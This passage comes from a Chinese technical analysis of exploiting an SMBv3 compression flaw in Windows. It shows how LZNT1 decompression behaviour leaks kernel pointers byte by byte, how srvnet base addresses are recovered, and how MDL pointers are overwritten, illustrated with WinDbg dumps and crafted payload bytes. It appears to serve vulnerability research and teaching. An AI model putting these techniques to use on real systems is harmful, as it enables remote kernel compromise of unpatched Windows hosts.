08 fffff800`482b2900 fffff800`45280202     nt!KiDispatchException+0x15f

```

Zecops 利用思路的灵魂是通过判断 LZNT1 解压是否成功来泄露单个字节，有点爆破的意思在里面。

### LZNT1 解压特性

通过逆向可以发现 LZNT1 压缩数据由压缩块组成，每个压缩块有两个字节的块头部，通过最高位是否设置可判断该块是否被压缩，其与 0xFFF 相与再加 3（2 字节的 chunk header+1 字节的 flag）为这个压缩块的长度。每个压缩块中有若干个小块，每个小块开头都有存放标志的 1 字节数据。该字节中的每个比特控制后面的相应区域，是直接复制 (0) 还是重复复制(1)。

![](https://images.seebug.org/content/images/2020/09/24/1600927619000-11sposn.png-w331s)

这里先举个后面会用到的例子，如下所示。解压时首先取出 2 个字节的块头部 0xB007，0xB007&0xFFF+3=0xa，所以这个块的大小为 10，就是以下这 10 个字节。然后取出标志字节 0x14，其二进制为 00010100，对应了后面的 8 项数据，如果相应的比特位为 0，就直接将该字节项复制到待解压缓冲区，如果相应比特位为 1，表示数据有重复，从相应的偏移取出两个字节数据，根据环境计算出复制的源地址和复制的长度。

![](https://images.seebug.org/content/images/2020/09/24/1600927620000-12yvgml.png-w331s)

由于 0x14 的前两个比特为 0，b0 00 直接复制到目标缓冲区，下一个比特位为 1，则取出 0x007e，复制 0x7e+3（0x81）个 00 到目标缓冲区，然后下一个比特位是 0，复制 ff 到目标缓冲区，下个比特位为 1，所以又取出 0x007c，复制 0x7c+3（0x7f）个 FF 到目标缓冲区，由于此时已走到边界点，对该压缩块的解压结束。以下为解压结果：

```
kd> db ffffa508`31ac115e lff+3+1
ffffa508`31ac115e  b0 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac116e  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac117e  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac118e  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac119e  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac11ae  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac11be  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac11ce  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac11de  00 00 00 ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac11ee  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac11fe  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac120e  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac121e  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac122e  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac123e  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac124e  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac125e  ff ff ff                                         ...

```

Zecops 在文章中提出可通过向目标发送压缩测试数据并检测该连接是否断开来判断是否解压失败，如果解压失败，则连接断开，而利用 LZNT1 解压的特性可通过判断解压成功与否来泄露 1 字节数据。下面来总结解压成功和解压失败的模式。

**00 00 模式：** 文中提示 LZNT1 压缩数据可以 00 00 结尾（类似于以 NULL 终止的字符串，可选的）。如下所示，当读取到的长度为 0 时跳出循环，在比较了指针没有超出边界之后，正常退出函数。

```
// RtlDecompressBufferLZNT1
    v11 = *(_WORD *)compressed_data_point; 
    if ( !*(_WORD *)compressed_data_point )
      break;
    ......
  }
  v17 = *(_DWORD **)&a6; 
  if ( compressed_data_point <= compressed_data_boundary )
  {
    **(_DWORD **)&a6 = (_DWORD)decompress_data_p2 - decompress_data_p1;
    goto LABEL_15;
  }
LABEL_32:
  v10 = 0xC0000242;                             // 错误流程
  *v17 = (_DWORD)compressed_data_point;
LABEL_15:
  if ( _InterlockedExchangeAdd((volatile signed __int32 *)&v23, 0xFFFFFFFF) == 1 )
    KeSetEvent(&Event, 0, 0);
  KeWaitForSingleObject(&Event, Executive, 0, 0, 0i64);
  if ( v10 >= 0 && v23 < 0 )
    v10 = HIDWORD(v23);
  return (unsigned int)v10;
}

```

**XX XX FF FF FF 模式：** 满足 XX XX FF FF FF 模式的压缩块会在解压时产生错误，其中，XXXX&FFF>0 且第二个 XX 的最高位为 1。作者在进行数据泄露的时候使用的 FF FF 满足此条件，关键代码如下，当标志字节为 FF 时，由于第一个标志位被设置，会跳出上面的循环，然后取出两个字节的 0xFFFF。由于比较第一个比特位的时候就跳出循环，decompress_data_p1、decompress_data_p2 和 decompress_data_p3 都指向原始的目标缓冲区（本来也就是起点）。所以 v11 也是初始值 0xD，v14（v15）为标志位 1 相应的双字 0xFFFF。由于 decompress_data_p1 - 0xFFFF >> 0xD -1 肯定小于 decompress_data_p2，会返回错误码 0xC0000242。

```
   if ( *compressed_data_p1 & 1 )
        break;
   *decompress_data_p1 = compressed_data_p1[1];
   ......
}
while ( decompress_data_p1 > decompress_data_p3 )
{
   v11 = (unsigned int)(v11 - 1);
   decompress_data_p3 = (_BYTE *)(dword_14037B700[v11] + decompress_data_p2);
}
v13 = compressed_data_p1 + 1;
v14 = *(_WORD *)(compressed_data_p1 + 1);
v15 = v14;
v17 = dword_14037B744[v11] & v14;
v11 = (unsigned int)v11;
v16 = v17;
v18 = &decompress_data_p1[-(v15 >> v11) - 1];
if ( (unsigned __int64)v18 < decompress_data_p2 )
    return 0xC0000242i64;

//调试数据
kd> 
nt!LZNT1DecompressChunk+0x66e:
fffff802`52ddd93e 488d743eff      lea     rsi,[rsi+rdi-1]
kd> p
nt!LZNT1DecompressChunk+0x673:
fffff802`52ddd943 493bf2          cmp     rsi,r10
kd> 
nt!LZNT1DecompressChunk+0x676:
fffff802`52ddd946 0f82cd040000    jb      nt!LZNT1DecompressChunk+0xb49 (fffff802`52ddde19)
kd> 
nt!LZNT1DecompressChunk+0xb49:
fffff802`52ddde19 b8420200c0      mov     eax,0C0000242h

```

**单字节泄露思路**

泄露的思路就是利用解压算法的上述特性，在想要泄露的字节后面加上 b0（满足压缩标志）以及一定数量的 00 和 FF，00 表示的数据为绝对有效数据。当处理完一个压缩块之后，会继续向后取两个字节，如果取到的是 00 00，解压就会正常完成，如果是 00 FF 或者 FF FF，解压就会失败。

```
kd> db ffffa508`31ac1158
ffffa508`31ac1158  18 3a 80 34 08 a5 b0 00-00 00 00 00 00 00 00 00  .:.4............
ffffa508`31ac1168  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac1178  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................

```

如下所示，a5 是想要泄露的字节，先假设可以将测试数据放在后面。根据解压算法可知，首先会取出 b0a5，然后和 0xfff 相与后加 3，得到 a8，从 a5 开始数 a8 个字节，这些数据都属于第一个压缩块。如果要求第二次取出来的双字还是 00 00，就需要 a8-2+2 个字节的 00，也就是 a5+3。如果 00 的个数小于 x+3，第二次取双字的时候就一定会命中后面的 FF，触发错误。采用二分法找到满足条件的 x，使得当 00 的数量为 x+3 时解压缩正常完成，并且当 00 的数量为 x+2 时解压失败，此时得到要泄露的那个字节数据 x。

![](https://images.seebug.org/content/images/2020/09/24/1600927620000-13ouqoa.png-w331s)

下面开始步入正题，一步一步获取关键模块基址，劫持系统执行流程。为了方便描述利用思路，在 Windows 1903 单核系统上进行调试，利用前还需要收集各漏洞版本以下函数在模块中的偏移，以便后续进行匹配，计算相应模块基址及函数地址：

<table><thead><tr><th><strong>srvnet.sys</strong></th><th><strong>ntoskrnl.exe</strong></th></tr></thead><tbody><tr><td>srvnet!SrvNetWskConnDispatch</td><td>nt!IoSizeofWorkItem</td></tr><tr><td>srvnet!imp_IoSizeofWorkItem</td><td>nt!MiGetPteAddress</td></tr><tr><td>srvnet!imp_RtlCopyUnicodeString</td><td></td></tr></tbody></table>

### 泄露 User Buffer 指针

这一步要泄露的数据是已知大小缓冲区的 User Buffer 指针（POC 中是 0x2100）。请求包结构如下，Offset 为 0x2116，Originalsize 为 0，由于 Offset+Originalsize=0x2116，所以会分配大小为 0x4100 的 User Buffer 来存放还原的数据。然而，原始请求包的 User Buffer 大小为 0x2100（可容纳 0x10 大小的头和 0x1101 大小的 Data），Offset 0x2116 明显超出了该缓冲区的长度，在后续的 memcpy 操作中会存在越界读取。Offset 欺骗也是 1206 的一部分，在取得 Offset 的值之后没有判断其大小是否超出的 User Buffer 的界限，从而在解压成功后将这部分数据复制到一个可控的区域。又由于数据未初始化，可利用 LZNT1 解压将目标指针泄露出来。

![](https://images.seebug.org/content/images/2020/09/24/1600927621000-14epfhf.png-w331s)

以下为请求包的 Srvnet Buffer Header 信息，由于复制操作是从 Raw Data 区域开始（跳过 0x10 头部），因而越界读取并复制的数据长度为 0x2116+0x10-0x2100 = 0x26，这包括存放在 Srvnet Buffer Header 偏移 0x18 处的 User Buffer 指针 0xffffa50836240050。

```
kd> g
request: ffffa508`36240050  424d53fc 00000000 00000001 00002116
srv2!Srv2DecompressData+0x26:
fffff802`51ce7e86 83782410        cmp     dword ptr [rax+24h],10h

kd> dd rax
ffffa508`36242150  2f566798 ffffa508 2f566798 ffffa508
ffffa508`36242160  00010002 00000000 36240050 ffffa508
ffffa508`36242170  00002100 00001111 00002288 c0851000

kd> dd ffffa508`36240050+10+2116-6-10 l8
ffffa508`36242160  00010002 00000000 36240050 ffffa508
ffffa508`36242170  00002100 00001111 00002288 c0851000

```

以下为分配的 0x4100 的缓冲区，其 User Buffer 首地址为 0xffffa50835a92050：

```
kd> g
alloc: ffffa508`35a92050  cf8b48d6 006207e8 ae394c00 00000288
srv2!Srv2DecompressData+0x85:
fffff802`51ce7ee5 488bd8          mov     rbx,rax
kd> dd rax
ffffa508`35a96150  a1e83024 48fffaef 4810478b 30244c8d
ffffa508`35a96160  00020002 00000000 35a92050 ffffa508
ffffa508`35a96170  00004100 00000000 000042a8 245c8b48

```

由于解压成功，所以进入 memcpy 流程，0x2100 缓冲区的 User Buffer 指针 0xffffa50836240050 被复制到 0x4100 缓冲区偏移 0x2108 处:

```
kd> dd ffffa508`35a92050 + 2100
ffffa508`35a94150  840fc085 000000af 24848d48 000000a8
ffffa508`35a94160  24448948 548d4120 b9410924 00000eda
kd> p
srv2!Srv2DecompressData+0x10d:
fffff802`51ce7f6d 8b442460        mov     eax,dword ptr [rsp+60h]
kd> dd ffffa508`35a92050 + 2100
ffffa508`35a94150  00010002 00000000 36240050 ffffa508
ffffa508`35a94160  00002100 548d1111 b9410924 00000eda

```

然后下一步是覆盖 0x4100 缓冲区中存放的 0x2100 缓冲区 User Buffer Ptr 中 08 a5 后面的 ffff 等数据（由于地址都是以 0xffff 开头，所以这两个字节可以不用测）。为了不破坏前面的数据（不执行 memcpy），要使得解压失败（在压缩的测试数据后面填充 \ xFF），但成功解压出测试数据。

![](https://images.seebug.org/content/images/2020/09/24/1600927622000-15nunre.png-w331s)

以下为解压前后保存的 User Buffer Ptr 的状态，可以发现解压后的数据正好满足之前所讲的单字节泄露模式，如果可欺骗程序使其解压 0xffffa50835a9415d 处的数据，就可以通过多次测试泄露出最高位 0xa5：

```
//待解压数据
kd> dd ffffa508`31edb050+10+210e
ffffa508`31edd16e  b014b007 ff007e00 ffff007c ffffffff
ffffa508`31edd17e  ffffffff ffffffff ffffffff ffffffff
ffffa508`31edd18e  ffffffff ffffffff ffffffff ffffffff
ffffa508`31edd19e  ffffffff ffffffff ffffffff ffffffff
ffffa508`31edd1ae  ffffffff ffffffff ffffffff ffffffff
ffffa508`31edd1be  ffffffff ffffffff ffffffff ffffffff
ffffa508`31edd1ce  ffffffff ffffffff ffffffff ffffffff
ffffa508`31edd1de  ffffffff ffffffff ffffffff ffffffff

//解压前数据
kd> db r9 - 6
ffffa508`35a94158  50 00 24 36 08 a5 ff ff-00 21 00 00 11 11 8d 54  P.$6.....!.....T
ffffa508`35a94168  24 09 41 b9 da 0e 00 00-45 8d 44 24 01 48 8b ce  $.A.....E.D$.H..
ffffa508`35a94178  ff 15 c2 68 01 00 85 c0-78 27 8b 94 24 a8 00 00  ...h....x'..$...
ffffa508`35a94188  00 0f b7 c2 c1 e8 08 8d-0c 80 8b c2 c1 e8 10 0f  ................
ffffa508`35a94198  b6 c0 03 c8 0f b6 c2 8d-0c 41 41 3b cf 41 0f 96  .........AA;.A..
ffffa508`35a941a8  c4 48 8d 44 24 30 48 89-44 24 20 ba 0e 00 00 00  .H.D$0H.D$ .....
ffffa508`35a941b8  41 b9 db 0e 00 00 44 8d-42 f4 48 8b ce ff 15 75  A.....D.B.H....u
ffffa508`35a941c8  68 01 00 85 c0 78 2f 8b-54 24 30 0f b7 c2 c1 e8  h....x/.T$0.....

kd> p
srv2!Srv2DecompressData+0xe1:
fffff802`51ce7f41 85c0            test    eax,eax
//解压后数据
kd> db ffffa508`35a9415d lff
ffffa508`35a9415d  a5 b0 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`35a9416d  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`35a9417d  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`35a9418d  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`35a9419d  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`35a941ad  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`35a941bd  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`35a941cd  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`35a941dd  00 00 00 00 ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`35a941ed  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`35a941fd  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`35a9420d  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`35a9421d  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`35a9422d  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`35a9423d  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`35a9424d  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff     ...............

```

控制后续的请求包占用之前布置好的 0x4100 缓冲区，设置 Offset 使其指向待泄露的那个字节，利用 LZTN1 解压算法从高位到低位逐个泄露字节。主要是利用 LZTN1 解压算法特性以及 SMB2 协商，在 SMB2 协商过程中使用 LZTN1 压缩，对 SMB2 SESSION SETUP 请求数据进行压缩。构造如下请求，如果 LZNT1 测试数据解压成功，就代表要泄露的数据不小于 0 的个数减 3，并且由于解压成功，SMB2 SESSION SETUP 数据成功被复制。如果解压失败，SMB2 SESSION SETUP 数据不会被复制，连接断开。根据连接是否还在调整 0 的个数，如果连接断开，就增大 0 的个数，否则减小 0 的个数，直到找到临界值，泄露出那个字节。

![](https://images.seebug.org/content/images/2020/09/24/1600927623000-16ketfn.png-w331s)

### 泄露 srvnet 基址

SRVNET_BUFFER_HDR 第一项为 ConnectionBufferList.Flink 指针（其指向 SRVNET_RECV 偏移 0x58 处的 ConnectionBufferList.Flink），SRVNET_RECV 偏移 0x100 处存放了 AcceptSocket 指针。AcceptSocket 偏移 0x30 处为 srvnet!SrvNetWskConnDispatch 函数指针。可通过泄露这个指针，然后减去已有偏移得到 srvnet 模块的基址。

![](https://images.seebug.org/content/images/2020/09/24/1600927624000-17aqrcl.png-w331s)

```
//SRVNET_BUFFER_HDR
kd> dd rax
ffffa508`31221150  2f566798 ffffa508 2f566798 ffffa508
ffffa508`31221160  00030002 00000000 31219050 ffffa508
ffffa508`31221170  00008100 00008100 000082e8 ffffffff
ffffa508`31221180  31219000 ffffa508 312211e0 ffffa508
ffffa508`31221190  00000000 ffffffff 00008100 00000000
ffffa508`312211a0  31221260 ffffa508 31221150 ffffa508

//SRVNET_RECV->AcceptSocket
kd> dq ffffa5082f566798 - 58 + 100
ffffa508`2f566840  ffffa508`36143c28 00000000`00000000
ffffa508`2f566850  00000000`00000000 ffffa508`3479cd18
ffffa508`2f566860  ffffa508`2f4a6dc0 ffffa508`34ae4170
ffffa508`2f566870  ffffa508`35f56040 ffffa508`34f19520

//srvnet!SrvNetWskConnDispatch
kd> u poi(ffffa508`36143c28+30)
srvnet!SrvNetWskConnDispatch:
fffff802`57d3d170 50              push    rax
fffff802`57d3d171 5a              pop     rdx
fffff802`57d3d172 d15702          rcl     dword ptr [rdi+2],1
fffff802`57d3d175 f8              clc
fffff802`57d3d176 ff              ???
fffff802`57d3d177 ff00            inc     dword ptr [rax]
fffff802`57d3d179 6e              outs    dx,byte ptr [rsi]
fffff802`57d3d17a d15702          rcl     dword ptr [rdi+2],1

```

**泄露 ConnectionBufferList.Flink 指针** 首先要泄露 ConnectionBufferList.Flink 指针，以便泄露 AcceptSocket 指针以及 srvnet!SrvNetWskConnDispatch 函数指针。在这里使用了另一种思路：使用正常压缩的数据 [:-6] 覆盖 ConnectionBufferList.Flink 指针之前数据，这样在解压的时候正好可以带出这 6 个字节，要注意请求数据长度与 Offset+0x10 的差值，这个差值应该大于压缩数据 + 6 的长度。在这个过程中需要保持一个正常连接，使得泄露出的 ConnectionBufferList 所在的 SRVNET_RECV 结构是有效的。如下所示，解压后的数据长度正好为 0x2b，其中，后 6 位为 ConnectionBufferList 的低 6 个字节。

```
kd> g
request: ffffa508`31219050  424d53fc 0000002b 00000001 000080e3
srv2!Srv2DecompressData+0x26:
fffff802`51ce7e86 83782410        cmp     dword ptr [rax+24h],10h

kd> db ffffa508`31219050+80e3+10 l20   //待解压数据
ffffa508`31221143  10 b0 40 41 42 43 44 45-46 1b 50 58 00 18 3a 80  ..@ABCDEF.PX..:.
ffffa508`31221153  34 08 a5 ff ff 18 3a 80-34 08 a5 ff ff 02 00 03  4.....:.4.......

kd> g
srv2!Srv2DecompressData+0xdc:
fffff802`51ce7f3c e86f650406      call    srvnet!SmbCompressionDecompress (fffff802`57d2e4b0)
kd> db r9 l30   //解压前缓冲区
ffffa508`31ac1133  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac1143  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac1153  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
kd> p
srv2!Srv2DecompressData+0xe1:
fffff802`51ce7f41 85c0            test    eax,eax
kd> db ffffa508`31ac1133 l30   //解压后缓冲区
ffffa508`31ac1133  41 42 43 44 45 46 41 42-43 44 45 46 41 42 43 44  ABCDEFABCDEFABCD
ffffa508`31ac1143  45 46 41 42 43 44 45 46-41 42 43 44 45 46 41 42  EFABCDEFABCDEFAB
ffffa508`31ac1153  43 44 45 46 58 18 3a 80-34 08 a5 ff ff ff ff ff  CDEFX.:.4.......

```

然后向目标缓冲区偏移 0x810e 处解压覆盖测试数据 b0 00 00 ... ，之前解压出的 0x2b 大小的数据放在了偏移 0x80e3 处，如果要从最后一位开始覆盖，那解压缩的偏移就是 0x810e+0x2b（即 0x810e）。

```
kd> g
request: ffffa508`31edb050  424d53fc 00007ff2 00000001 0000810e
srv2!Srv2DecompressData+0x26:
fffff802`51ce7e86 83782410        cmp     dword ptr [rax+24h],10h

//解压前
kd> db rdx   //rdx指向待解压数据
ffffa508`31ee316e  07 b0 14 b0 00 7e 00 ff-7c 00 ff ff ff ff ff ff  .....~..|.......
ffffa508`31ee317e  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ee318e  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ee319e  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ee31ae  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ee31be  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ee31ce  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ee31de  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................

kd> db r9-6 l30   //r9指向目标缓冲区
ffffa508`31ac1158  18 3a 80 34 08 a5 ff ff-ff ff ff ff ff ff ff ff  .:.4............
ffffa508`31ac1168  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac1178  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................

//解压后
kd> db ffffa508`31ac1158 l30
ffffa508`31ac1158  18 3a 80 34 08 a5 b0 00-00 00 00 00 00 00 00 00  .:.4............
ffffa508`31ac1168  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac1178  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................

```

然后采用和之前一样的方式泄露该地址低 6 个字节。根据连接是否断开调整 00 的长度，直到找到满足临界点的值，从而泄露出 ConnectionBufferList。

```
kd> g
request: ffffa508`31ab9050  424d53fc 00008004 00000001 000080fd
srv2!Srv2DecompressData+0x26:
fffff802`51ce7e86 83782410        cmp     dword ptr [rax+24h],10h

kd> db rdx-6 l100
ffffa508`31ac1157  58 18 3a 80 34 08 a5 b0-00 00 00 00 00 00 00 00  X.:.4...........
ffffa508`31ac1167  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac1177  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac1187  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac1197  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac11a7  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac11b7  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac11c7  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac11d7  00 00 00 00 00 00 00 00-00 00 ff ff ff ff ff ff  ................
ffffa508`31ac11e7  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac11f7  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac1207  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac1217  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac1227  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac1237  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac1247  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................

```

后面就是继续获取 AcceptSocket 指针以及 srvnet!SrvNetWskConnDispatch 函数指针。SrvNetFreeBuffer 函数中存在如下代码（有省略），可帮助我们将某地址处的值复制到一个可控的地址。当 BufferFlags 为 3 时，pMdl1 指向 MDL 中的 MappedSystemVa 会变成之前的值加 0x50，pMdl2 指向的 MDL 中的 StartVa 被赋值为 pMdl1->MappedSystemVa + 0x50 的高 52 位，pMdl2 指向的 MDL 中的 ByteOffset 被赋值为 pMdl1->MappedSystemVa + 0x50 的低 12 位。也就是说 pMdl2 的 StartVa 和 ByteOffset 中会分开存放原先 pMdl1 中的 MappedSystemVa 的值加 0x50 的数据。

```
void SrvNetFreeBuffer(PSRVNET_BUFFER_HDR Buffer)
{
    PMDL pMdl1 = Buffer->pMdl1;
    PMDL pMdl2 = Buffer->pMdl2;

    if (Buffer->BufferFlags & 0x02) {
        if (Buffer->BufferFlags & 0x01) {
            pMdl1->MappedSystemVa = (BYTE*)pMdl1->MappedSystemVa + 0x50；
            pMdl2->StartVa = (PVOID)((ULONG_PTR)pMdl1->MappedSystemVa & ~0xFFF)；
            pMdl2->ByteOffset = pMdl1->MappedSystemVa & 0xFFF
        }

        Buffer->BufferFlags = 0;

        // ...

        pMdl1->Next = NULL;
        pMdl2->Next = NULL;

        // Return the buffer to the lookaside list.
    } else {
        SrvNetUpdateMemStatistics(NonPagedPoolNx, Buffer->PoolAllocationSize, FALSE);
        ExFreePoolWithTag(Buffer->PoolAllocationPtr, '00SL');
    }
}

```

可利用上述流程，将指定地址处的数据再加 0x50 的值复制到 pMdl2 指向的结构中，然后再利用之前的方法逐字节泄露。思路是通过覆盖两个 pmdl 指针，覆盖 pmdl1 指针为 AcceptSocket 指针减 0x18，这和 MDL 结构相关，如下所示，其偏移 0x18 处为 MappedSystemVa 指针，这样可使得 AcceptSocket 地址正好存放在 pMdl1->MappedSystemVa。然后覆盖 pmdl2 指针为一个可控的内存，POC 中为之前泄露的 0x2100 内存的指针加 0x1250 偏移处。这样上述代码执行后，就会将 AcceptSocket 地址的信息存放在 pmdl2 指向的 MDL 结构（已知地址）中。

```
kd> dt _mdl
win32k!_MDL
   +0x000 Next             : Ptr64 _MDL
   +0x008 Size             : Int2B
   +0x00a MdlFlags         : Int2B
   +0x00c AllocationProcessorNumber : Uint2B
   +0x00e Reserved         : Uint2B
   +0x010 Process          : Ptr64 _EPROCESS
   +0x018 MappedSystemVa   : Ptr64 Void
   +0x020 StartVa          : Ptr64 Void
   +0x028 ByteCount        : Uint4B
   +0x02c ByteOffset       : Uint4B

kd> ?ffffa50834803a18-58+100-18
Evaluate expression: -100020317570392 = ffffa508`34803aa8

kd> ?ffffa50836240000+1250  //这个和no transport header相关
Evaluate expression: -100020290055600 = ffffa508`36241250

//覆盖前
kd> dd ffffa508`31ab9050+10138
ffffa508`31ac9188  31ac91e0 ffffa508 00000000 00000000
ffffa508`31ac9198  00000000 00000000 31ac92a0 ffffa508
ffffa508`31ac91a8  00000000 00000000 00000000 00000000

//覆盖后
kd> dd ffffa508`31ac9188
ffffa508`31ac9188  34803aa8 ffffa508 00000000 00000000
ffffa508`31ac9198  00000000 00000000 36241250 ffffa508
ffffa508`31ac91a8  00000000 00000000 00000000 00000000

```

之后通过解压覆盖偏移 0x10 处的 BufferFlags，使其由 2 变为 3，压缩数据后面加入多个 "\xFF" 使得解压失败，这样在后续调用 SrvNetFreeBuffer 函数时才能进入上述流程。其中：flag 第一个比特位被设置代表没有 Transport Header，所以那段代码实际上是留出了传输头。

```
kd> dd r9-10
ffffa508`31ac9150  00000000 00000000 34ba42d8 ffffa508
ffffa508`31ac9160  00040002 00000000 31ab9050 ffffa508
ffffa508`31ac9170  00010100 00000000 00010368 ffffa508
ffffa508`31ac9180  31ab9000 ffffa508 34803aa8 ffffa508
ffffa508`31ac9190  00000000 00000000 00000000 00000000
ffffa508`31ac91a0  36241250 ffffa508 00000000 00000000

kd> dd ffffa508`31ac9150
ffffa508`31ac9150  00000000 00000000 34ba42d8 ffffa508
ffffa508`31ac9160  00040003 00000000 31ab9050 ffffa508
ffffa508`31ac9170  00010100 00000000 00010368 ffffa508
ffffa508`31ac9180  31ab9000 ffffa508 34803aa8 ffffa508
ffffa508`31ac9190  00000000 00000000 00000000 00000000
ffffa508`31ac91a0  36241250 ffffa508 00000000 00000000

```

当调用 SrvNetFreeBuffer 释放这个缓冲区时会触发那段流程，此时想泄露的数据已经放在了 0xffffa50836241250 处的 MDL 结构中。如下所示，为 0xffffa5083506b848。然后再用之前的方法依次泄露 0xffffa50836241250 偏移 0x2D、0x2C、0x25、0x24、0x23、0x22、0x21 处的字节，然后组合成 0xffffa5083506b848。

```
kd> dt _mdl ffffa50836241250 
win32k!_MDL
   +0x000 Next             : (null) 
   +0x008 Size             : 0n56
   +0x00a MdlFlags         : 0n4
   +0x00c AllocationProcessorNumber : 0
   +0x00e Reserved         : 0
   +0x010 Process          : (null) 
   +0x018 MappedSystemVa   : (null) 
   +0x020 StartVa          : 0xffffa508`3506b000 Void
   +0x028 ByteCount        : 0xffffffb0
   +0x02c ByteOffset       : 0x848

kd> db ffffa50836241250 
ffffa508`36241250  00 00 00 00 00 00 00 00-38 00 04 00 00 00 00 00  ........8.......
ffffa508`36241260  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`36241270  00 b0 06 35 08 a5 ff ff-b0 ff ff ff 48 08 00 00  ...5........H...

kd> ?poi(ffffa508`34803aa8+18)   //AcceptSocket - 0x50
Evaluate expression: -100020308756408 = ffffa508`3506b848

```

由于之前 flag 加上了 1，没有传输头，所以 SRVNET_BUFFER_HDR 偏移 0x18 处的 user data 指针比之前多 0x50（计算偏移的时候要注意）。这次将 BufferFlags 覆盖为 0，在 SrvNetFreeBuffer 函数中就不会将其直接加入 SrvNetBufferLookasides 表，而是释放该缓冲区。

```
kd> dd r9-10
ffffa508`31ac9150  00000000 00000000 35caba58 ffffa508
ffffa508`31ac9160  00040002 00000000 31ab90a0 ffffa508
ffffa508`31ac9170  00010100 00000000 00010368 ffffa508
ffffa508`31ac9180  31ab9000 ffffa508 34803aa8 ffffa508
ffffa508`31ac9190  00000000 00000000 00000000 00000000
ffffa508`31ac91a0  36241250 ffffa508 00000000 00000000

kd> dd ffffa508`31ac9150
ffffa508`31ac9150  00000000 00000000 35caba58 ffffa508
ffffa508`31ac9160  00040000 00000000 31ab90a0 ffffa508
ffffa508`31ac9170  00010100 00000000 00010368 ffffa508
ffffa508`31ac9180  31ab9000 ffffa508 34803aa8 ffffa508
ffffa508`31ac9190  00000000 00000000 00000000 00000000
